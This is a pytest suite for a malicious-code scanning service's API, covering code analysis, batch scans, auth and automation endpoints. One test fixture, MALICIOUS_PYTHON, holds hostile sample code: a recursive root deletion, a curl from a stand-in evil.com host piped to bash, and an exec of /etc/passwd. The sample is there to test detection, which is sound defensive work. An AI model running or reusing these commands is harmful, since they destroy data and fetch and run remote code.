"""
Comprehensive test suite for Soteria middleware API endpoints.
Covers: /analyze, /batch-scan, /github-scan, auth, automation, and utility routes.

Run: pytest tests/test_middleware_api.py -v
"""
import json
import os
import sys
import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
sys.path.insert(0, os.path.join(ROOT, "backend", "src"))

os.environ.setdefault("MAKE_WEBHOOK_SECRET", "test_secret_for_ci")

import tempfile
import shutil

from middleware.app import app, SCAN_DB_PATH, init_scan_db, init_users_db


@pytest.fixture(autouse=True)
def isolate_db(tmp_path, monkeypatch):
    """Use a temporary SQLite database for each test to avoid locking."""
    test_db = tmp_path / "test_scan_history.db"
    import middleware.app as mapp
    monkeypatch.setattr(mapp, "SCAN_DB_PATH", test_db)
    init_scan_db()
    init_users_db()
    yield


@pytest.fixture
def client():
    app.config["TESTING"] = True
    with app.test_client() as c:
        yield c


@pytest.fixture
def auth_headers(client):
    """Register a test user and return Bearer auth headers."""
    import uuid
    email = f"fixture_{uuid.uuid4().hex[:8]}@acid.dev"
    signup = client.post("/api/auth/signup", json={
        "name": "Test User",
        "email": email,
        "password": "securepassword123"
    })
    data = signup.get_json()
    assert "token" in data, f"Signup failed ({signup.status_code}): {data}"
    return {"Authorization": f"Bearer {data['token']}", "Content-Type": "application/json"}


@pytest.fixture
def automation_headers():
    return {
        "X-Automation-Secret": "test_secret_for_ci",
        "Idempotency-Key": "test-idem-key-001",
        "Content-Type": "application/json"
    }


# ═══════════════════════════════════════════════════════════════
# /analyze endpoint
# ═══════════════════════════════════════════════════════════════

class TestAnalyze:
    CLEAN_PYTHON = "def add(a, b):\n    return a + b\n"
    MALICIOUS_PYTHON = (
        "import os\nimport subprocess\n"
        "subprocess.call(['rm', '-rf', '/'])\n"
        "os.system('curl http://evil.com | bash')\n"
        "exec(compile(open('/etc/passwd').read(), '<string>', 'exec'))\n"
    )

    def test_analyze_clean_code(self, client):
        resp = client.post("/analyze", json={"code": self.CLEAN_PYTHON})
        assert resp.status_code == 200
        data = resp.get_json()
        assert "malicious" in data
        assert "risk_level" in data
        assert "confidence" in data
        assert "language" in data
        assert data["risk_level"] in ("LOW", "MEDIUM", "HIGH", "CRITICAL", "INVALID")

    def test_analyze_malicious_code(self, client):
        resp = client.post("/analyze", json={"code": self.MALICIOUS_PYTHON})
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["risk_level"] in ("HIGH", "CRITICAL")

    def test_analyze_empty_code(self, client):
        resp = client.post("/analyze", json={"code": ""})
        assert resp.status_code == 400
        data = resp.get_json()
        assert "error" in data or "message" in data

    def test_analyze_no_code_field(self, client):
        resp = client.post("/analyze", json={})
        assert resp.status_code == 400

    def test_analyze_oversized_code(self, client):
        huge = "x = 1\n" * 60000
        resp = client.post("/analyze", json={"code": huge})
        assert resp.status_code == 400

    def test_analyze_syntax_error_code(self, client):
        resp = client.post("/analyze", json={"code": "def foo(\n    bar baz"})
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["risk_level"] in ("INVALID", "LOW", "MEDIUM")

    def test_analyze_non_string_code(self, client):
        resp = client.post("/analyze", json={"code": 12345})
        assert resp.status_code in (200, 400)

    def test_analyze_returns_metadata(self, client):
        resp = client.post("/analyze", json={"code": self.CLEAN_PYTHON})
        data = resp.get_json()
        assert "metadata" in data
        assert "nodes_scanned" in data["metadata"]

    def test_analyze_with_auth(self, client, auth_headers):
        resp = client.post("/analyze", json={"code": self.CLEAN_PYTHON},
                           headers=auth_headers)
        assert resp.status_code == 200

    def test_analyze_javascript(self, client):
        js_code = "function hello() {\n  console.log('hello');\n}\n"
        resp = client.post("/analyze", json={"code": js_code})
        assert resp.status_code == 200


# ═══════════════════════════════════════════════════════════════
# /batch-scan endpoint
# ═══════════════════════════════════════════════════════════════

class TestBatchScan:
    def test_batch_scan_single_file(self, client, auth_headers):
        resp = client.post("/batch-scan", json={
            "files": [{"filename": "test.py", "code": "x = 1\n"}]
        }, headers=auth_headers)
        assert resp.status_code == 200
        data = resp.get_json()
        assert "results" in data
        assert "summary" in data
        assert data["summary"]["total_files"] == 1

    def test_batch_scan_multiple_files(self, client, auth_headers):
        files = [
            {"filename": "a.py", "code": "a = 1\n"},
            {"filename": "b.py", "code": "b = 2\n"},
            {"filename": "c.py", "code": "c = 3\n"},
        ]
        resp = client.post("/batch-scan", json={"files": files}, headers=auth_headers)
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["summary"]["total_files"] == 3

    def test_batch_scan_empty_files(self, client, auth_headers):
        resp = client.post("/batch-scan", json={"files": []}, headers=auth_headers)
        assert resp.status_code == 400

    def test_batch_scan_no_files_field(self, client, auth_headers):
        resp = client.post("/batch-scan", json={}, headers=auth_headers)
        assert resp.status_code == 400

    def test_batch_scan_exceeds_limit(self, client, auth_headers):
        files = [{"filename": f"f{i}.py", "code": "x=1\n"} for i in range(51)]
        resp = client.post("/batch-scan", json={"files": files}, headers=auth_headers)
        assert resp.status_code == 400

    def test_batch_scan_mixed_valid_invalid(self, client, auth_headers):
        files = [
            {"filename": "good.py", "code": "x = 1\n"},
            {"filename": "empty.py", "code": ""},
        ]
        resp = client.post("/batch-scan", json={"files": files}, headers=auth_headers)
        assert resp.status_code == 200
        data = resp.get_json()
        assert len(data["results"]) >= 2

    def test_batch_scan_returns_project_grade(self, client, auth_headers):
        files = [{"filename": "t.py", "code": "print('hi')\n"}]
        resp = client.post("/batch-scan", json={"files": files}, headers=auth_headers)
        data = resp.get_json()
        assert "project_grade" in data["summary"]
        assert data["summary"]["project_grade"] in ("A", "B", "C", "D", "F")


# ═══════════════════════════════════════════════════════════════
# /github-scan endpoint
# ═══════════════════════════════════════════════════════════════

class TestGithubScan:
    def test_github_scan_missing_url(self, client, auth_headers):
        resp = client.post("/github-scan", json={}, headers=auth_headers)
        assert resp.status_code == 400

    def test_github_scan_invalid_url(self, client, auth_headers):
        resp = client.post("/github-scan", json={"repo_url": "https://gitlab.com/foo/bar"}, headers=auth_headers)
        assert resp.status_code == 400

    def test_github_scan_empty_url(self, client, auth_headers):
        resp = client.post("/github-scan", json={"repo_url": ""}, headers=auth_headers)
        assert resp.status_code == 400


# ═══════════════════════════════════════════════════════════════
# Auth endpoints
# ═══════════════════════════════════════════════════════════════

class TestAuth:
    def test_signup_success(self, client):
        import uuid
        email = f"test_{uuid.uuid4().hex[:8]}@acid.dev"
        resp = client.post("/api/auth/signup", json={
            "name": "New User",
            "email": email,
            "password": "password123"
        })
        assert resp.status_code == 200
        data = resp.get_json()
        assert "token" in data
        assert data["user"]["email"] == email

    def test_signup_duplicate_email(self, client):
        email = "duplicate_test@acid.dev"
        client.post("/api/auth/signup", json={
            "name": "First", "email": email, "password": "password123"
        })
        resp = client.post("/api/auth/signup", json={
            "name": "Second", "email": email, "password": "password456"
        })
        assert resp.status_code == 409

    def test_signup_short_password(self, client):
        resp = client.post("/api/auth/signup", json={
            "name": "Short", "email": "short@acid.dev", "password": "12345"
        })
        assert resp.status_code == 400

    def test_signup_missing_fields(self, client):
        resp = client.post("/api/auth/signup", json={"name": "Only Name"})
        assert resp.status_code == 400

    def test_login_success(self, client):
        email = "login_test_user@acid.dev"
        client.post("/api/auth/signup", json={
            "name": "Login Tester", "email": email, "password": "password123"
        })
        resp = client.post("/api/auth/login", json={
            "email": email, "password": "password123"
        })
        assert resp.status_code == 200
        assert "token" in resp.get_json()

    def test_login_wrong_password(self, client):
        email = "wrong_pw_test@acid.dev"
        client.post("/api/auth/signup", json={
            "name": "Wrong PW", "email": email, "password": "correct123"
        })
        resp = client.post("/api/auth/login", json={
            "email": email, "password": "wrong123"
        })
        assert resp.status_code == 401

    def test_login_nonexistent_user(self, client):
        resp = client.post("/api/auth/login", json={
            "email": "nobody@acid.dev", "password": "whatever"
        })
        assert resp.status_code == 401

    def test_me_with_valid_token(self, client, auth_headers):
        resp = client.get("/api/auth/me", headers=auth_headers)
        assert resp.status_code == 200
        assert "user" in resp.get_json()

    def test_me_without_token(self, client):
        resp = client.get("/api/auth/me")
        assert resp.status_code == 401

    def test_me_with_invalid_token(self, client):
        resp = client.get("/api/auth/me", headers={
            "Authorization": "Bearer invalid.token.here"
        })
        assert resp.status_code == 401

    def test_admin_login_success(self, client):
        admin_pw = os.environ.get("ADMIN_PASSWORD", "ci-test-admin-pw")
        resp = client.post("/api/auth/admin/login", json={
            "email": "admin@soteria.dev", "password": admin_pw
        })
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["user"]["is_admin"] is True

    def test_admin_login_non_admin(self, client):
        email = "nonadmin@acid.dev"
        client.post("/api/auth/signup", json={
            "name": "Not Admin", "email": email, "password": "password123"
        })
        resp = client.post("/api/auth/admin/login", json={
            "email": email, "password": "password123"
        })
        assert resp.status_code == 401


# ═══════════════════════════════════════════════════════════════
# Automation endpoints
# ═══════════════════════════════════════════════════════════════

class TestAutomation:
    def test_run_improver_success(self, client, automation_headers):
        resp = client.post("/automation/run-improver", json={
            "mode": "draft_only",
            "task_type": "test_task"
        }, headers=automation_headers)
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["status"] == "success"
        assert "task_id" in data

    def test_run_improver_bad_secret(self, client):
        resp = client.post("/automation/run-improver", json={
            "mode": "draft_only"
        }, headers={
            "X-Automation-Secret": "wrong_secret",
            "Idempotency-Key": "test-key",
            "Content-Type": "application/json"
        })
        assert resp.status_code == 401

    def test_run_improver_missing_idempotency(self, client):
        resp = client.post("/automation/run-improver", json={
            "mode": "draft_only"
        }, headers={
            "X-Automation-Secret": "test_secret_for_ci",
            "Content-Type": "application/json"
        })
        assert resp.status_code == 400

    def test_run_improver_wrong_mode(self, client, automation_headers):
        resp = client.post("/automation/run-improver", json={
            "mode": "auto_merge"
        }, headers=automation_headers)
        assert resp.status_code == 400

    def test_run_improver_idempotent(self, client):
        headers = {
            "X-Automation-Secret": "test_secret_for_ci",
            "Idempotency-Key": "idempotent-test-key-unique",
            "Content-Type": "application/json"
        }
        resp1 = client.post("/automation/run-improver", json={
            "mode": "draft_only", "task_type": "idem_test"
        }, headers=headers)
        resp2 = client.post("/automation/run-improver", json={
            "mode": "draft_only", "task_type": "idem_test"
        }, headers=headers)
        assert resp1.status_code == 200
        assert resp2.status_code == 200
        assert resp2.get_json().get("duplicate") is True

    def test_improve_endpoint(self, client):
        resp = client.get("/automation/improve", headers={
            "X-Automation-Secret": "test_secret_for_ci"
        })
        assert resp.status_code == 200

    def test_automation_status(self, client):
        resp = client.get("/automation/status", headers={
            "X-Automation-Secret": "test_secret_for_ci"
        })
        assert resp.status_code == 200
        data = resp.get_json()
        assert "queue" in data
        assert "circuit_breaker" in data

    def test_render_webhook_auth_header(self, client):
        resp = client.post("/automation/webhook/render-deploy", json={
            "event": "deploy_failed",
            "deploy": {"id": "d1", "status": "build_failed", "commit": {}},
            "service": {"name": "test"},
            "logs": "Error: module not found"
        }, headers={
            "X-Automation-Secret": "test_secret_for_ci",
            "Content-Type": "application/json"
        })
        assert resp.status_code == 200

    def test_render_webhook_query_param(self, client):
        resp = client.post(
            "/automation/webhook/render-deploy?secret=test_secret_for_ci",
            json={
                "event": "deploy_failed",
                "deploy": {"id": "d2", "status": "build_failed", "commit": {}},
                "service": {"name": "test"},
                "logs": "Build error xyz"
            },
            content_type="application/json"
        )
        assert resp.status_code == 200

    def test_render_webhook_no_auth(self, client):
        resp = client.post("/automation/webhook/render-deploy", json={
            "event": "deploy_failed"
        })
        assert resp.status_code == 401


# ═══════════════════════════════════════════════════════════════
# Utility endpoints
# ═══════════════════════════════════════════════════════════════

class TestUtility:
    def test_model_stats(self, client):
        resp = client.get("/model-stats")
        assert resp.status_code == 200
        data = resp.get_json()
        assert "status" in data

    def test_scan_history(self, client):
        resp = client.get("/scan-history")
        assert resp.status_code == 200
        data = resp.get_json()
        assert "scans" in data
        assert "total" in data

    def test_scan_history_pagination(self, client):
        resp = client.get("/scan-history?limit=5&offset=0")
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["limit"] == 5

    def test_security_score_requires_auth(self, client):
        resp = client.get("/security-score")
        assert resp.status_code == 401

    def test_security_score_with_auth(self, client, auth_headers):
        resp = client.get("/security-score", headers=auth_headers)
        assert resp.status_code == 200
        data = resp.get_json()
        assert "score" in data
        assert "grade" in data

    def test_generate_report(self, client, auth_headers):
        resp = client.post("/generate-report", json={
            "code": "print('hello')",
            "verdict": False,
            "confidence": 95.0,
            "risk_level": "LOW",
            "reason": "Safe code",
            "language": "python"
        }, headers=auth_headers)
        assert resp.status_code == 200
        assert resp.content_type == "application/pdf"
